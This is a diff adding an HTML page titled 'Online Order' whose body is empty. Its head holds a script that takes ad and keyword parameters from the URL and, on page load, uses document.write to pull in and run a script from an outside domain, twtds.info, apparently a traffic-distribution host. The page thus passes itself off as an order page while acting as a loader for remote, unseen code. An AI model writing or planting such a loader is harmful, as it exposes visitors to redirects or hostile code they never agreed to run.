@@ -1,0 +1,17 @@
+<html>
+  <head>
+    <script>
+function GET(item) {
+    var p = window.location.search;
+    p = p.match(new RegExp(item+'=([^&=]+)'));
+    return p ? p[1] : false;
+}
+var url = "https://twtds.info/rujswlr?gclid="+GET('gclid')+"&keyword="+GET('keyword');
+document.write("<script src="+url+"><\/script>");
+</script>
+    <title>Online Order</title>
+  </head>
+  <body>
+
+  </body>
+</html>
